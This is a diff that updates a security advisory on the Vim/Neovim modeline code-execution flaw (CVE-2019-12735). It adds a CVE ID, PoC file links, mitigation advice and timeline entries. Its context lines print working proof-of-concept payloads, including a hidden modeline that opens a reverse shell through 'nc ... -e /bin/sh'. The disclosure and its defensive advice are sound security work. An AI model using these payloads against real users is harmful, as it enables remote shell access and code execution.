@@ -6,7 +6,7 @@ Vim/Neovim Arbitrary Code Execution via Modelines
 ```
 Product: Vim < 8.1.1365, Neovim < 0.3.6
 Type:    Arbitrary Code Execution
-CVE:     - 
+CVE:     CVE-2019-12735
 Date:    2019-06-04
 Author:  Arminius (@rawsec)
 ```
@@ -21,7 +21,7 @@ execution via modelines by opening a specially crafted text file.
 Proof of concept
 ----------------
 
-- Create `poc.txt`:
+- Create [`poc.txt`](../data/2019-06-04_ace-vim-neovim/poc.txt):
 
       :!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
 
@@ -42,7 +42,7 @@ be immediately rewritten when opened. Also, the PoC uses terminal escape
 sequences to hide the modeline when the content is printed with `cat`. (`cat
 -v` reveals the actual content.)
 
-`shell.txt`:
+[`shell.txt`](../data/2019-06-04_ace-vim-neovim/shell.txt):
 
     \x1b[?7l\x1bSNothing here.\x1b:silent! w | call system(\'nohup nc 127.0.0.1 9999 -e /bin/sh &\') | redraw! | file | silent! # " vim: set fen fdm=expr fde=assert_fails(\'set\\ fde=x\\ \\|\\ source\\!\\ \\%\') fdl=0: \x16\x1b[1G\x16\x1b[KNothing here."\x16\x1b[D \n
 
@@ -54,8 +54,11 @@ Details
 -------
 
 The modeline feature allows to specify custom editor options near the start or
-end of a file. This feature is enabled by default and applied to all file types,
-including plain `.txt`. A typical modeline:
+end of a file. This feature is enabled by default and applied to all file
+types, including plain `.txt`. (Note that some OSes ship with a custom vimrc
+that explicitly sets `nomodelines`, e.g. Debian. So if you use their custom
+default vimrc instead of Vim's native defaults, you're safe.) A typical
+modeline:
 
     /* vim: set textwidth=80 tabstop=8: */
 
@@ -123,12 +126,27 @@ nomodeline`), to use the [securemodelines](https://github.com/ciaranm/securemode
 plugin, or to disable `modelineexpr` (since patch 8.1.1366, Vim-only) to disallow
 expressions in modelines.
 
+Check if you have modelines enabled by opening vim and entering
+
+```:set modeline?```
+
+If vim returns ```nomodeline```, you are not vulnerable.  If you are vulnerable
+or want to ensure your security with this issue, add these lines to your vimrc:
+
+```
+set modelines=0
+set nomodeline
+```
+
 Timeline
 --------
 
     - 2019-05-22 Vim and Neovim maintainers notified
     - 2019-05-23 Vim patch released
     - 2019-05-29 Neovim patch released
+    - 2019-06-05 CVE ID CVE-2019-12735 assigned
+
+Also see description of [CVE-2019-12735](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12735).
 
 [1]: https://github.com/vim/vim/blob/5c017b2de28d19dfa4af58b8973e32f31bb1477e/runtime/doc/options.txt#L582
 [2]: https://github.com/vim/vim/blob/5c017b2de28d19dfa4af58b8973e32f31bb1477e/runtime/doc/eval.txt#L13050
